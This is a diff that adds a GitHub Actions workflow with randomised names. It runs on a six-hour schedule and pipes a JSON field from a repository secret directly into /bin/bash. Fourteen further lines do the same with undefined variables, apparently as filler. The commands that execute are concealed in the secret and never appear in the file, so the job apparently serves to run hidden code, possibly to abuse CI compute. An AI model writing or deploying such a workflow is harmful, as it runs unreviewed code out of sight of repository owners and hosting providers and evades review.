@@ -1,0 +1,31 @@
+name: zxykyy
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zxykyy
+        env:
+          wcco78184: ${{ secrets.wcco78184 }}
+        run: |
+          echo $wcco78184 | jq -r .rcpds095 | /bin/bash
+          echo $wlzbx58 | jq -r .ctg60967 | /bin/bash
+          echo $nq13344 | jq -r .hh220 | /bin/bash
+          echo $vdd44 | jq -r .qozu23 | /bin/bash
+          echo $jck4742 | jq -r .za6 | /bin/bash
+          echo $hlw95534 | jq -r .szvl9 | /bin/bash
+          echo $mozez135 | jq -r .hdlg13 | /bin/bash
+          echo $m22 | jq -r .swcxn14820 | /bin/bash
+          echo $vdhcq9733 | jq -r .ob6 | /bin/bash
+          echo $sjyv3 | jq -r .n95 | /bin/bash
+          echo $sdeet119 | jq -r .zyrke3 | /bin/bash
+          echo $z52191 | jq -r .qbww560 | /bin/bash
+          echo $xk3748 | jq -r .kcc3246 | /bin/bash
+          echo $ao3 | jq -r .wg19638 | /bin/bash
+          echo $hpo168 | jq -r .ixghy3 | /bin/bash
+
